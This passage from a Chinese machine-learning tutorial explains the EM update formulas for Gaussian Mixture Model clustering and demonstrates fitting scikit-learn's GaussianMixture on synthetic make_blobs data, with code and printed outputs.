mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3478em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<ul>
<li><strong>更新混合权重</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>（标量）</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mi>j</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">\pi_{j} = \frac{1}{m} \sum_{i=1}^{m}  \gamma_{j}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span></span></span></div>
<ul>
<li><strong>更新协方差</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>（矩阵）</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub><mo>=</mo><mfrac><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>−</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>−</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup></mrow><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\Sigma_{j} = \frac{{\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}(\mathbf{x}^{(i)}-\boldsymbol{\mu}_{j})(\mathbf{x}^{(i)}-\boldsymbol{\mu}_{j})^{T}}{ {\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1955em;vertical-align:-1.3478em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8478em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span><span style="top:-3.2748em;"><span class="pstrut" style="height:3.0448em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.8478em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3478em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>重复执行E步和M步，不断更新<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>π</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_{j},\boldsymbol{\mu}_{j},\pi_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0636em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>，通常迭代 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn></mrow><annotation encoding="application/x-tex">20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">20</span></span></span></span></span>-<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn></mrow><annotation encoding="application/x-tex">100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">100</span></span></span></span></span> 次，最终会收敛到一个局部最优解。</p>
<p>最终我们得到了的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 个高斯分布 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo>∣</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mathbf{x} \mid \boldsymbol{\mu}_j, \Sigma_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1302em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>及其权重<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>，以及每个样本对各个高斯分布的隶属度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">\gamma_j^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4578em;vertical-align:-0.413em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span></span></span>。这些参数完整刻画了所有数据的混合分布。</p>
<p>如果你理解了上述数学流程，那么即使不使用现成的GMM库，仅用Python和NumPy也能实现一个完整的GMM聚类算法。下面将展示如何调用成熟的机器学习库来使用GMM算法。</p>
<p>首先，确保已安装必要的Python库。如果尚未安装<code>Scikit-learn</code>，可通过以下命令安装：</p>
<pre><code class="hljs language-bash" lang="bash">pip install scikit-learn
</code></pre>
<p>为了演示GMM算法的应用，我们需要一个合适的数据集。因为没有现成的真实数据集，这里就使用<code>make_blobs</code>函数生成一个随机的合成数据集。这个函数特别适合生成符合混合高斯分布的数据，因为它本身就是通过叠加多个高斯分布来创建数据的。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> make_blobs

<span class="hljs-comment"># 生成示例数据</span>
<span class="hljs-comment"># n_samples: 样本数量（500个）</span>
<span class="hljs-comment"># n_features: 特征维度（3维）</span>
<span class="hljs-comment"># centers: 聚类中心数量（4个）</span>
<span class="hljs-comment"># cluster_std: 每个簇的标准差（控制簇的紧密度）</span>
<span class="hljs-comment"># random_state: 随机种子，确保结果可复现</span>
dataset, _ = make_blobs(
    n_samples=<span class="hljs-number">500</span>, 
    n_features=<span class="hljs-number">3</span>, 
    centers=<span class="hljs-number">4</span>, 
    cluster_std=<span class="hljs-number">1.8</span>, 
    random_state=<span class="hljs-number">3212</span>
)

<span class="hljs-built_in">print</span>(dataset.shape)	<span class="hljs-comment"># 查看数据的形状</span>
<span class="hljs-built_in">print</span>(dataset[:<span class="hljs-number">10</span>])	<span class="hljs-comment"># 查看前10个数据</span>

<span class="hljs-comment"># === 输出 ===</span>
(<span class="hljs-number">500</span>,<span class="hljs-number">3</span>)

[[ -<span class="hljs-number">2.2167599</span> ,  -<span class="hljs-number">7.11603166</span>,   <span class="hljs-number">3.99062792</span>],
 [ -<span class="hljs-number">1.90878361</span>,  -<span class="hljs-number">4.10948361</span>,   <span class="hljs-number">5.1927847</span> ],
 [ -<span class="hljs-number">1.96540003</span>,  -<span class="hljs-number">6.17016357</span>,   <span class="hljs-number">2.79308236</span>],
 [ -<span class="hljs-number">1.90406637</span>,   <span class="hljs-number">0.73862831</span>, -<span class="hljs-number">10.0718729</span> ],
 [ -<span class="hljs-number">9.08810591</span>,  -<span class="hljs-number">6.24574275</span>,  -<span class="hljs-number">1.24825942</span>],
 [ -<span class="hljs-number">6.03737854</span>,  -<span class="hljs-number">6.50248559</span>,   <span class="hljs-number">2.76654161</span>],
 [ -<span class="hljs-number">1.46453584</span>,  -<span class="hljs-number">8.28078741</span>,   <span class="hljs-number">2.93290504</span>],
 [ -<span class="hljs-number">1.87337298</span>,  -<span class="hljs-number">5.32761017</span>,   <span class="hljs-number">3.79653868</span>],
 [  <span class="hljs-number">6.21321387</span>,   <span class="hljs-number">4.5978286</span> ,  -<span class="hljs-number">5.75274046</span>],
 [-<span class="hljs-number">10.68329327</span>, -<span class="hljs-number">10.08210729</span>,  -<span class="hljs-number">1.48406785</span>]]
</code></pre>
<p>这段代码生成了一个包含500个样本、3个特征的数据集，这些样本来自4个不同的高斯分布。每个分布的中心位置由<code>centers</code>参数控制，而<code>cluster_std</code>参数决定了每个分布的离散程度。</p>
<p>接下来，我们使用Scikit-learn的<code>GaussianMixture</code>类来定义GMM模型。创建模型时需要设置多个重要参数，每个参数都对模型性能有直接影响：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.mixture <span class="hljs-keyword">import</span> GaussianMixture

<span class="hljs-comment"># 创建GMM模型实例</span>
gmm = GaussianMixture(
    n_components=<span class="hljs-number">4</span>,           <span class="hljs-comment"># ! 要识别的聚类数量（高斯分布个数）</span>
    covariance_type=<span class="hljs-string">"full"</span>,   <span class="hljs-comment"># 协方差矩阵类型：完全协方差（每个成分有自己的任意协方差矩阵）</span>
    tol=<span class="hljs-number">1e-3</span>,                 <span class="hljs-comment"># 收敛阈值：当对数似然增益小于此值时停止迭代</span>
    max_iter=<span class="hljs-number">50</span>,              <span class="hljs-comment"># ! 最大迭代次数：EM算法的最大迭代轮数</span>
    init_params=<span class="hljs-string">"kmeans"</span>,     <span class="hljs-comment"># 初始化方法：使用K-means进行参数初始化（比随机初始化更稳定）</span>
    random_state=<span class="hljs-number">42</span>,          <span class="hljs-comment"># 随机种子：确保结果可重复</span>
)

<span class="hljs-comment"># 训练GMM模型</span>
gmm.fit(dataset)
<span class="hljs-comment"># x</span>

<span class="hljs-built_in">print</span>(gmm.weights_)	<span class="hljs-comment"># 获取每个高斯分布的权重</span>
<span class="hljs-built_in">print</span>(gmm.means_)	<span class="hljs-comment"># 获取每个高斯分布的均值向量</span>
<span class="hljs-built_in">print</span>(gmm.covariances_.shape)	<span class="hljs-comment"># 获取各高斯成分的协方差矩阵形状</span>
<span class="hljs-built_in">print</span>(gmm.covariances_[<span class="hljs-number">0</span>])	<span class="hljs-comment"># 查看第一个高斯成分的协方差矩阵</span>

<span class="hljs-comment"># === 输出 ===</span>

<span class="hljs-comment"># 分别是第0个，第1个，第2个，第3个高斯分布的权重</span>
[<span class="hljs-number">0.25001436</span>, <span class="hljs-number">0.25</span>      , <span class="hljs-number">0.23822018</span>, <span class="hljs-number">0.26176546</span>]

<span class="hljs-comment"># 分别是第0个，第1个，第2个，第3个高斯分布的均值向量 mu</span>
[[-<span class="hljs-number">9.27389593</span>, -<span class="hljs-number">7.07418061</span>, -<span class="hljs-number">0.82308003</span>],
 [ <span class="hljs-number">2.60201839</span>,  <span class="hljs-number">3.72587996</span>, -<span class="hljs-number">8.02382928</span>],
 [-<span class="hljs-number">5.24683692</span>, -<span class="hljs-number">7.48695937</span>,  <span class="hljs-number">1.07606264</span>],
 [-<span class="hljs-number">1.02626245</span>, -<span class="hljs-number">6.35110703</span>,  <span class="hljs-number">4.6423531</span> ]]

<span class="hljs-comment"># 4个3x3的协方差矩阵</span>
(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>)

<span class="hljs-comment"># 第一个高斯成分的协方差矩阵</span>
[[ <span class="hljs-number">3.56369354</span>,  <span class="hljs-number">0.33917216</span>, -<span class="hljs-number">0.19620971</span>],
 [ <span class="hljs-number">0.33917216</span>,  <span class="hljs-number">3.24354619</span>, -<span class="hljs-number">0.17032308</span>],
 [-<span class="hljs-number">0.19620971</span>, -<span class="hljs-number">0.17032308</span>,  <span class="hljs-number">2.71638609</span>]]
</code></pre>
<p>训练完成后，我们可以使用模型进行预测和概率计算：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建测试样本</span>
test_samples = np.array([
    [<span class="hljs-number">1.0</span>, <span class="hljs-number">4.1</span>, <span class="hljs-number">3.1</span>],    <span class="hljs-comment"># 测试样本1</span>
    [-<span class="hljs-number">8.0</span>, -<span class="hljs-number">6.0</span>, -<span class="hljs-number">0.5</span>], <span class="hljs-comment"># 测试样本2</span>
